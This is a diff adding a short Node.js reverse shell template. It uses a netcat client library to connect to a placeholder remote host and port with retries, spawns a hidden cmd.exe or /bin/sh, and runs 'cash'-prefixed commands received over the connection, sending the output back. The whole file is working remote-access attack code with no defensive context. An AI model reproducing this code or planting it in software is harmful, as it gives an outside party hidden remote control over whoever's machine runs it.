@@ -1,0 +1,33 @@
+const fs = require('fs')
+var NetcatClient = require('netcat').client
+const $ = require('cash')
+
+process.on('uncaughtException', function(err) {
+  fs.writeFileSync('log.txt', JSON.stringify(err.message))
+  process.exit(1)
+})
+
+var nc = new NetcatClient()
+
+// Marker replaced at runtime.
+var CMD = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
+var RHOST = '{{rhost}}'
+var RPORT = {{rport}}
+var RETRY = {{retry}}
+
+nc.addr(RHOST).port(RPORT).retry(RETRY).connect().exec(CMD, [], { windowsHide: true })
+
+nc.filter(function (chunk, enc, next) {
+  if (chunk.toString().indexOf('cash') === 0){
+    // filter it on pipe
+    next(null)
+  } else {
+    next(null, chunk)
+  }
+}).on('data', function(data){
+  // the filter doesn't apply on 'data' events, just on the pipe stream.
+  if (data.toString().indexOf('cash') === 0){
+    var argv = data.toString().replace('cash ', '')
+    this.send($(argv)) // execute Cross-platform cmd and send result
+  }
+})
